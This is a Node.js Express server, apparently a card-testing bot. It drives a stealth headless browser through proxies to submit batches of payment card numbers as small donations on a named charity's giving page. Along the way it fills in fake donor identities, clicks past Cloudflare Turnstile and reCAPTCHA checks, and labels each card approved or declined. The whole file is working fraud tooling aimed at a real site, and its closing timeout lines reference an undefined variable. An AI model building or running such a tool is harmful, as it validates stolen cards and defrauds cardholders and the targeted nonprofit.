require('dotenv').config();
const express = require('express');
const cors = require('cors');
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const { faker } = require('@faker-js/faker');

// Usar stealth para evitar detección
puppeteer.use(StealthPlugin());

const app = express();
app.use(cors());
app.use(express.json({ limit: '10mb' }));

const PORT = process.env.PORT || 3000;
const PROXY_STRING = process.env.PROXY_STRING || '';
const TARGET_URL = process.env.TARGET_URL || 'https://braveacademy.org/give-now-aca';
const HEADLESS = process.env.HEADLESS === 'false' ? false :
                 process.env.HEADLESS === 'new' ? 'new' : true;

let browser = null;

// ========== FUNCIÓN PARA ESPERAR SELECTOR CON TIMEOUT EXTENDIDO ==========
async function waitForSelector(page, selector, timeout = 600000) {
    try {
        await page.waitForSelector(selector, { timeout, visible: true });
        return true;
    } catch (e) {
        console.log(`⏳ Selector no encontrado (${timeout}ms): ${selector}`);
        return false;
    }
}

// ========== PROXY (autenticación separada) ==========
function parseProxy(proxyStr) {
    if (!proxyStr) return null;
    const match = proxyStr.match(/^(.*?):(.*?)@(.*?):(\d+)$/);
    if (match) {
        return {
            username: match[1],
            password: match[2],
            host: match[3],
            port: parseInt(match[4], 10)
        };
    }
    return null;
}

// ========== CREAR PÁGINA CON PROXY Y HEADERS COMPLETOS ==========
async function getNewPage() {
    if (browser) {
        await browser.close();
    }
    const proxyData = parseProxy(PROXY_STRING);
    const args = [
        '--no-sandbox',
        '--disable-setuid-sandbox',
        '--disable-dev-shm-usage',
        '--disable-gpu',
        '--disable-software-rasterizer',
        '--ignore-certificate-errors',
        '--disable-features=IsolateOrigins,site-per-process',
        '--disable-web-security',
        '--disable-features=BlockInsecurePrivateNetworkRequests'
    ];

    if (proxyData) {
        args.push(`--proxy-server=${proxyData.host}:${proxyData.port}`);
        args.push('--proxy-bypass-list=<-loopback>');
        console.log(`🔐 Proxy configurado: ${proxyData.host}:${proxyData.port}`);
    } else {
        console.log('⚠️ Sin proxy, usando conexión directa');
    }

    const launchOptions = {
        headless: HEADLESS,
        args: args,
        ignoreHTTPSErrors: true,
        timeout: 120000 // 2 minutos para lanzar
    };

    try {
        browser = await puppeteer.launch(launchOptions);
    } catch (error) {
        console.error('❌ Error al lanzar Chromium:', error.message);
        throw error;
    }

    const page = await browser.newPage();

    // Viewport realista
    await page.setViewport({
        width: 1366,
        height: 768,
        deviceScaleFactor: 1,
        hasTouch: false,
        isLandscape: true,
        isMobile: false
    });

    // Headers completos
    await page.setExtraHTTPHeaders({
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'es-US,es;q=0.9,en;q=0.8',
        'Cache-Control': 'max-age=0',
        'Connection': 'keep-alive',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-User': '?1',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
    });

    // User-Agent adicional (ya lo ponemos en headers, pero también en el navegador)
    await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');

    if (proxyData) {
        await page.authenticate({
            username: proxyData.username,
            password: proxyData.password
        });
    }

    return page;
}

// ========== GENERAR DIRECCIÓN ==========
function generarDireccion() {
    const firstName = faker.person.firstName();
    const lastName = faker.person.lastName();
    const email = `${firstName.toLowerCase()}.${lastName.toLowerCase()}${faker.number.int({ min: 10, max: 99 })}@gmail.com`;
    const street = faker.location.streetAddress();
    const city = faker.location.city();
    const state = 'CO';
    const zip = faker.location.zipCode('#####');
    return { firstName, lastName, email, street, city, state, zip };
}

// ========== LLENAR DIRECCIÓN CON TAB ==========
async function llenarDireccion(page, direccion) {
    console.log('🔍 Rellenando dirección...');
    console.log(`📦 ${direccion.firstName} ${direccion.lastName}, ${direccion.email}, ${direccion.street}, ${direccion.city}, ${direccion.zip}`);

    const firstNameSel = 'input[placeholder="First Name"]';
    await page.click(firstNameSel, { clickCount: 3 });
    await page.type(firstNameSel, direccion.firstName);

    await page.keyboard.press('Tab');
    await page.waitForTimeout(500);
    await page.keyboard.press('Tab');
    await page.waitForTimeout(500);

    await page.keyboard.down('Shift');
    await page.keyboard.press('End');
    await page.keyboard.up('Shift');
    await page.keyboard.press('Backspace');
    await page.type('input[placeholder="Last Name"]', direccion.lastName);

    await page.keyboard.press('Tab');
    await page.waitForTimeout(500);
    await page.keyboard.down('Shift');
    await page.keyboard.press('End');
    await page.keyboard.up('Shift');
    await page.keyboard.press('Backspace');
    await page.type('input[placeholder="Email Address"]', direccion.email);

    await page.keyboard.press('Tab');
    await page.waitForTimeout(500);
    await page.keyboard.down('Shift');
    await page.keyboard.press('End');
    await page.keyboard.up('Shift');
    await page.keyboard.press('Backspace');
    await page.type('input[placeholder="Address Line 1"]', direccion.street);

    await page.keyboard.press('Tab');
    await page.waitForTimeout(500);
    await page.keyboard.press('Tab');
    await page.waitForTimeout(500);
    await page.keyboard.down('Shift');
    await page.keyboard.press('End');
    await page.keyboard.up('Shift');
    await page.keyboard.press('Backspace');
    await page.type('input[placeholder="City"]', direccion.city);

    await page.keyboard.press('Tab');
    await page.waitForTimeout(500);
    await page.keyboard.press('Tab');
    await page.waitForTimeout(500);

    await page.type('input[placeholder="Zip"]', direccion.zip);
    console.log('✅ Dirección llenada');
}

// ========== RELLENAR DATOS DE TARJETA ==========
async function rellenarDatosTarjeta(page, numero, expira, cvv) {
    if (!page) {
        throw new Error('La página no está definida en rellenarDatosTarjeta');
    }
    console.log('🔄 Rellenando tarjeta...');
    
    // Esperar a que el iframe o los campos aparezcan (hasta 30 segundos)
    await page.waitForTimeout(3000);
    
    const frames = page.frames();
    let cardFrame = null;
    for (const f of frames) {
        try {
            const hasCardInput = await f.evaluate(() => {
                return document.querySelector('input.cc-input, input[placeholder*="Card Number"]') !== null;
            });
            if (hasCardInput) {
                cardFrame = f;
                break;
            }
        } catch (e) {}
    }
    // Si no se encuentra, buscar por nombre de frame (Stripe, Braintree, etc.)
    if (!cardFrame) {
        for (const f of frames) {
            const url = f.url();
            if (url.includes('stripe') || url.includes('braintree') || url.includes('payment') || url.includes('checkout')) {
                cardFrame = f;
                break;
            }
        }
    }
    const target = cardFrame || page;
    console.log(`📦 Frame de pago: ${cardFrame ? 'encontrado' : 'no encontrado, usando página principal'}`);

    const numSel = 'input.cc-input, input[placeholder*="Card Number"], input[data-elements-stable-field-name="cardNumber"], input[name="cardnumber"]';
    if (await waitForSelector(target, numSel, 300000)) {
        await target.click(numSel, { clickCount: 3 });
        await target.type(numSel, numero);
    } else {
        throw new Error('Campo número no encontrado');
    }

    const expSel = 'input.exp-input, input[placeholder*="MM/YY"], input[data-elements-stable-field-name="cardExpiry"], input[name="expiry"]';
    if (await waitForSelector(target, expSel, 300000)) {
        await target.click(expSel, { clickCount: 3 });
        await target.type(expSel, expira);
    } else {
        throw new Error('Campo fecha no encontrado');
    }

    const cvvSel = 'input.cvv-input, input[placeholder*="CVV"], input[data-elements-stable-field-name="cardCvc"], input[name="cvv"]';
    if (await waitForSelector(target, cvvSel, 300000)) {
        await target.click(cvvSel, { clickCount: 3 });
        await target.type(cvvSel, cvv);
    } else {
        throw new Error('Campo CVV no encontrado');
    }
    console.log('✅ Tarjeta ingresada');
}

// ========== FUNCIÓN PARA RESOLVER CAPTCHA (TURNSTILE / RECAPTCHA) ==========
// ========== FUNCIÓN PARA RESOLVER CAPTCHA (TURNSTILE / RECAPTCHA) ==========
async function resolverCaptcha(page) {
    console.log('🔍 Buscando captcha de Cloudflare Turnstile...');
    
    // Esperar a que cualquier frame de captcha cargue
    await page.waitForTimeout(5000);
    
    // Buscar en todos los frames
    const frames = page.frames();
    let captchaFrame = null;
    let frameUrl = '';
    
    for (const f of frames) {
        const url = f.url();
        if (url.includes('turnstile') || url.includes('challenges.cloudflare.com') || 
            url.includes('recaptcha') || url.includes('captcha') || url.includes('widget')) {
            captchaFrame = f;
            frameUrl = url;
            break;
        }
    }
    
    // Si no se encontró, buscar por iframe en el DOM principal
    if (!captchaFrame) {
        console.log('🔍 Buscando iframe de captcha en el DOM principal...');
        const iframeSelector = 'iframe[src*="turnstile"], iframe[src*="challenges.cloudflare"], iframe[src*="recaptcha"]';
        const iframeExists = await page.$(iframeSelector);
        if (iframeExists) {
            const src = await page.evaluate((sel) => {
                const el = document.querySelector(sel);
                return el ? el.src : null;
            }, iframeSelector);
            console.log(`📦 Iframe encontrado: ${src}`);
            // Intentar obtener el frame por su src
            for (const f of frames) {
                if (f.url() === src) {
                    captchaFrame = f;
                    frameUrl = src;
                    break;
                }
            }
        }
    }
    
    if (!captchaFrame) {
        // Intentar buscar el checkbox directamente en la página
        const checkbox = await page.$('input[type="checkbox"][aria-label="Verifique que es un ser humano"]');
        if (checkbox) {
            console.log('✅ Captcha checkbox encontrado en DOM principal, haciendo clic...');
            await checkbox.click();
            await page.waitForTimeout(5000);
            return true;
        }
        console.log('⚠️ No se encontró captcha (puede que ya esté resuelto)');
        return false;
    }
    
    console.log(`✅ Captcha iframe encontrado: ${frameUrl}`);
    
    try {
        // Intentar hacer clic en el checkbox dentro del iframe
        // Selectores comunes para el checkbox de Turnstile
        const checkboxSelectors = [
            'input[type="checkbox"]',
            '#checkbox',
            '[role="checkbox"]',
            '.mark',
            '.challenge-container input[type="checkbox"]'
        ];
        
        let clicked = false;
        for (const selector of checkboxSelectors) {
            try {
                const checkbox = await captchaFrame.$(selector);
                if (checkbox) {
                    console.log(`✅ Checkbox encontrado con selector: ${selector}`);
                    await checkbox.click();
                    console.log('✅ Captcha checkbox clickeado dentro del iframe');
                    clicked = true;
                    break;
                }
            } catch (e) {
                // Ignorar errores en este selector
            }
        }
        
        if (!clicked) {
            // Último intento: clic en el centro del iframe
            console.log('⚠️ No se encontró checkbox, intentando clic en el centro del iframe...');
            const frameElement = await page.$('iframe[src*="turnstile"]');
            if (frameElement) {
                await frameElement.click();
                clicked = true;
                console.log('✅ Clic en el centro del iframe');
            }
        }
        
        if (clicked) {
            console.log('⏳ Esperando resolución del captcha (hasta 30 segundos)...');
            // Esperar a que el iframe desaparezca o cambie su estado
            let resolved = false;
            for (let i = 0; i < 30; i++) {
                await page.waitForTimeout(1000);
                // Verificar si el iframe aún existe
                const stillExists = await page.$('iframe[src*="turnstile"]');
                if (!stillExists) {
                    console.log('✅ Captcha resuelto (iframe desapareció)');
                    resolved = true;
                    break;
                }
                // Verificar si aparece el texto "Success" o "Verificado"
                const hasSuccess = await page.evaluate(() => {
                    return document.body.innerText.includes('Success') || 
                           document.body.innerText.includes('Verificado') ||
                           document.body.innerText.includes('Verifique que es un ser humano');
                });
                if (hasSuccess) {
                    console.log('✅ Captcha resuelto (texto de éxito detectado)');
                    resolved = true;
                    break;
                }
            }
            if (!resolved) {
                console.log('⚠️ Captcha no se resolvió completamente, continuando...');
            }
            return true;
        } else {
            console.log('❌ No se pudo interactuar con el captcha');
            return false;
        }
    } catch (error) {
        console.error('❌ Error al resolver captcha:', error.message);
        return false;
    }
}
// ========== VERIFICAR UNA TARJETA (con tiempos exagerados) ==========
async function verificarTarjetaUnica(cardData, amount, direccion, page = null, isFirstCard = false) {
    const [numero, mes, año, cvv] = cardData.split('|');
    const mesFormateado = mes.padStart(2, '0');
    const añoCorto = año.slice(-2);
    const expira = `${mesFormateado}/${añoCorto}`;

    try {
        let currentPage = page;

        // ---- PRIMERA TARJETA: crear página y navegar ----
        if (isFirstCard) {
            currentPage = await getNewPage();
            console.log(`🔍 Navegando a ${TARGET_URL}...`);
            await currentPage.goto(TARGET_URL, {
                waitUntil: 'networkidle0',
                timeout: 600000,
                ignoreHTTPSErrors: true
            });
            // Espera extra para que cargue todo
            await currentPage.waitForTimeout(5000);

            // ---- LLENAR MONTO ----
            console.log('⏳ Buscando campo de monto...');
            let montoFound = false;
            const montoSelector = 'input[data-cy="gift-amount-input-0"]';
            if (await waitForSelector(currentPage, montoSelector, 600000)) {
                await currentPage.click(montoSelector, { clickCount: 3 });
                await currentPage.type(montoSelector, amount);
                console.log('✅ Monto (data-cy)');
                montoFound = true;
            }
            if (!montoFound) {
                const fallback = 'input[placeholder="0.00"]';
                if (await waitForSelector(currentPage, fallback, 600000)) {
                    await currentPage.click(fallback, { clickCount: 3 });
                    await currentPage.type(fallback, amount);
                    console.log('✅ Monto (placeholder)');
                    montoFound = true;
                }
            }
            if (!montoFound) {
                const numInput = await currentPage.$('input[inputmode="decimal"]');
                if (numInput) {
                    await numInput.click({ clickCount: 3 });
                    await numInput.type(amount);
                    console.log('✅ Monto (inputmode)');
                    montoFound = true;
                }
            }
            if (!montoFound) {
                const inputs = await currentPage.$$('input[type="text"]');
                for (const input of inputs) {
                    const visible = await input.isVisible();
                    if (visible) {
                        const placeholder = await input.evaluate(el => el.placeholder || '');
                        if (placeholder.includes('0.00') || placeholder.includes('amount')) {
                            await input.click({ clickCount: 3 });
                            await input.type(amount);
                            console.log('✅ Monto (genérico)');
                            montoFound = true;
                            break;
                        }
                    }
                }
            }
            if (!montoFound) {
                const result = await currentPage.evaluate((amt) => {
                    const inputs = document.querySelectorAll('input[inputmode="decimal"], input[type="text"]');
                    for (const inp of inputs) {
                        if (inp.offsetParent !== null && (inp.placeholder.includes('0.00') || inp.placeholder.includes('amount'))) {
                            inp.value = amt;
                            inp.dispatchEvent(new Event('input', { bubbles: true }));
                            inp.dispatchEvent(new Event('change', { bubbles: true }));
                            return true;
                        }
                    }
                    return false;
                }, amount);
                if (result) {
                    console.log('✅ Monto (eval)');
                    montoFound = true;
                }
            }
            if (!montoFound) {
                await currentPage.screenshot({ path: 'debug_monto.png' });
                throw new Error('No se encontró el campo de monto');
            }

            // ---- ADD PAYMENT METHOD ----
            const continueBtn = '[data-cy="gift-continue-to-payment-btn"]';
            if (await waitForSelector(currentPage, continueBtn, 600000)) {
                await currentPage.click(continueBtn);
                console.log('✅ Add Payment Method');
                await currentPage.waitForTimeout(5000);
            } else {
                console.log('⚠️ Add Payment Method no encontrado, asumiendo que ya estamos en pago');
            }
        } else {
            console.log('🔄 Usando página existente para siguiente tarjeta...');
        }

        // ---- ESPERA SEGURA ----
        if (!currentPage) {
            console.log('⚠️ Página perdida, creando nueva...');
            currentPage = await getNewPage();
            await currentPage.goto(TARGET_URL, {
                waitUntil: 'networkidle0',
                timeout: 120000,
                ignoreHTTPSErrors: true
            });
            return await verificarTarjetaUnica(cardData, amount, direccion, currentPage, true);
        }
        await currentPage.waitForTimeout(5000);

        // ---- SELECCIONAR CARD ----
        const cardBtn = '[data-cy="payment-type-card-btn"]';
        if (await waitForSelector(currentPage, cardBtn, 600000)) {
            const isActive = await currentPage.$eval(cardBtn, el => el.classList.contains('active'));
            if (!isActive) {
                await currentPage.click(cardBtn);
                console.log('✅ Card seleccionado');
                await currentPage.waitForTimeout(5000);
            }
        } else {
            try {
                await currentPage.click('text=Card');
                await currentPage.waitForTimeout(5000);
            } catch (e) {
                console.log('⚠️ No se pudo seleccionar Card');
            }
        }

        // ---- RELLENAR TARJETA ----
        await rellenarDatosTarjeta(currentPage, numero, expira, cvv);

        // ---- DIRECCIÓN ----
        if (isFirstCard) {
            await llenarDireccion(currentPage, direccion);
        } else {
            console.log('⚠️ Saltando dirección (ya guardada)');
            await currentPage.waitForTimeout(5000);
        }

        // ---- REVIEW DETAILS (con reintentos) ----
        const reviewBtn = '[data-cy="payment-save-btn"]';
        let reviewClicked = false;
        for (let attempt = 0; attempt < 3; attempt++) {
            console.log(`🔄 Intentando Review Details (${attempt+1}/3)...`);
            try {
                const exists = await currentPage.$(reviewBtn);
                if (exists) {
                    await currentPage.click(reviewBtn);
                    console.log('✅ Review Details clickeado');
                    reviewClicked = true;
                    break;
                }
            } catch (e) {}
            await currentPage.waitForTimeout(3000);
        }
        if (!reviewClicked) {
            await currentPage.evaluate((sel) => {
                const btn = document.querySelector(sel);
                if (btn) btn.click();
            }, reviewBtn);
            console.log('✅ Review Details forzado');
        }

        // ---- CAPTCHA (resolver con reintentos) ----
        console.log('⏳ Esperando 30 segundos para que el captcha cargue...');
        await currentPage.waitForTimeout(30000);

        let captchaResuelto = false;
        for (let attempt = 0; attempt < 3; attempt++) {
            console.log(`🔄 Intento de captcha ${attempt + 1}/3...`);
            captchaResuelto = await resolverCaptcha(currentPage);
            if (captchaResuelto) {
                console.log('✅ Captcha resuelto exitosamente');
                break;
            }
            console.log(`⚠️ Intento ${attempt + 1} falló, esperando 5 segundos...`);
            await currentPage.waitForTimeout(5000);
        }

        if (!captchaResuelto) {
            console.log('⚠️ No se pudo resolver captcha después de 3 intentos, continuando...');
        }

        // Esperar adicional después de resolver (o intentar resolver)
        await currentPage.waitForTimeout(10000);

        // ---- VERIFICAR UNABLE TO PROCESS ----
        const bodyText = await currentPage.evaluate(() => document.body.innerText);
        if (bodyText.includes('UNABLE TO PROCESS')) {
            console.log('⚠️ UNABLE TO PROCESS');
            const backBtn = '[data-cy="review-back-btn"]';
            if (await waitForSelector(currentPage, backBtn, 600000)) {
                await currentPage.click(backBtn);
                await currentPage.waitForTimeout(3000);
            }
            return { resultado: 'unable', mensaje: 'UNABLE TO PROCESS', isUnable: true, page: currentPage };
        }

        // ---- BOTÓN GIVE (esperar hasta 60 segundos) ----
        const giveBtn = '[data-cy="review-submit-btn"]';
        const backBtn = '[data-cy="review-back-btn"]';

        try {
            await currentPage.waitForFunction(
                (sel) => {
                    const btn = document.querySelector(sel);
                    return btn && !btn.classList.contains('disabled') && !btn.disabled;
                },
                { timeout: 60000 },
                giveBtn
            );
            console.log('✅ Botón Give habilitado');
            await currentPage.click(giveBtn);
            await currentPage.waitForTimeout(10000);
        } catch (e) {
            console.log('⏳ Give no habilitado después de 60s, Back...');
            if (await waitForSelector(currentPage, backBtn, 600000)) {
                await currentPage.click(backBtn);
                await currentPage.waitForTimeout(3000);
                return { resultado: 'declined', mensaje: 'Give timeout', isUnable: false, page: currentPage };
            }
            return { resultado: 'error', mensaje: 'No se encontró Give ni Back', isUnable: false, page: currentPage };
        }

        // ---- RESULTADO FINAL ----
        const finalText = await currentPage.evaluate(() => document.body.innerText);

        if (finalText.includes('Thank You')) {
            const screenshot = await currentPage.screenshot({ encoding: 'base64', fullPage: true });
            return { resultado: 'approved', mensaje: 'Donación exitosa', screenshot, isUnable: false, page: currentPage };
        } else if (finalText.includes('GIFT FAILED') || finalText.includes('Please verify your payment information')) {
            console.log('❌ GIFT FAILED, Back...');
            if (await waitForSelector(currentPage, backBtn, 600000)) {
                await currentPage.click(backBtn);
                await currentPage.waitForTimeout(3000);
                return { resultado: 'declined', mensaje: 'GIFT FAILED', isUnable: false, page: currentPage };
            }
            return { resultado: 'declined', mensaje: 'GIFT FAILED', isUnable: false, page: currentPage };
        } else {
            console.log('⚠️ Respuesta desconocida, Back...');
            if (await waitForSelector(currentPage, backBtn, 600000)) {
                await currentPage.click(backBtn);
                await currentPage.waitForTimeout(3000);
                return { resultado: 'error', mensaje: 'Respuesta desconocida', isUnable: false, page: currentPage };
            }
            return { resultado: 'error', mensaje: 'Respuesta desconocida', isUnable: false, page: currentPage };
        }

    } catch (error) {
        console.error('Error en verificación:', error);
        return { resultado: 'error', mensaje: error.message, isUnable: false, page: page };
    }
}

// ========== ENDPOINT PARA UNA SOLA TARJETA ==========
app.post('/api/check-card', async (req, res) => {
    const { card, amount } = req.body;
    if (!card || !amount) {
        return res.status(400).json({ error: 'Faltan datos' });
    }
    try {
        const direccion = generarDireccion();
        const resultado = await verificarTarjetaUnica(card, amount, direccion, null, true);
        res.json(resultado);
    } catch (e) {
        console.error('Endpoint error:', e);
        res.status(500).json({ resultado: 'error', mensaje: e.message });
    }
});

// ========== ENDPOINT PARA MÚLTIPLES TARJETAS ==========
app.post('/api/check-cards', async (req, res) => {
    const { cards, amount } = req.body;
    if (!cards || !Array.isArray(cards) || cards.length === 0) {
        return res.status(400).json({ error: 'Se requiere array de tarjetas' });
    }
    if (!amount) {
        return res.status(400).json({ error: 'Falta el monto' });
    }

    const direccion = generarDireccion();
    console.log(`📦 Dirección fija: ${direccion.firstName} ${direccion.lastName}`);

    const resultados = [];
    let unableConsecutivos = 0;
    let currentPage = null;
    let isFirstCard = true;

    for (let i = 0; i < cards.length; i++) {
        const card = cards[i];
        console.log(`\n🔹 Tarjeta ${i+1}/${cards.length}: ${card}`);

        const resultado = await verificarTarjetaUnica(card, amount, direccion, currentPage, isFirstCard);

        if (resultado.page) {
            currentPage = resultado.page;
            isFirstCard = false;
        } else {
            currentPage = null;
            isFirstCard = true;
        }

        if (resultado.resultado === 'unable') {
            unableConsecutivos++;
            if (unableConsecutivos >= 3) {
                console.log('🚨 3 UNABLE consecutivos, cerrando navegador...');
                if (browser) {
                    await browser.close();
                    browser = null;
                    currentPage = null;
                    isFirstCard = true;
                }
                unableConsecutivos = 0;
            }
        } else {
            unableConsecutivos = 0;
        }

        if (!resultado.hasOwnProperty('isUnable')) {
            resultado.isUnable = false;
        }

        resultados.push({ card, resultado });
    }

    if (browser) {
        await browser.close();
        browser = null;
    }

    res.json({ resultados });
});

// ========== HEALTH CHECK ==========
app.get('/api/health', (req, res) => {
    res.json({ status: 'ok' });
});

app.listen(PORT, () => {
    console.log(`🚀 Nirvana backend corriendo en puerto ${PORT}`);
});

// Timeouts extendidos (10 minutos)
server.timeout = 600000;
server.keepAliveTimeout = 600000;
server.headersTimeout = 600000;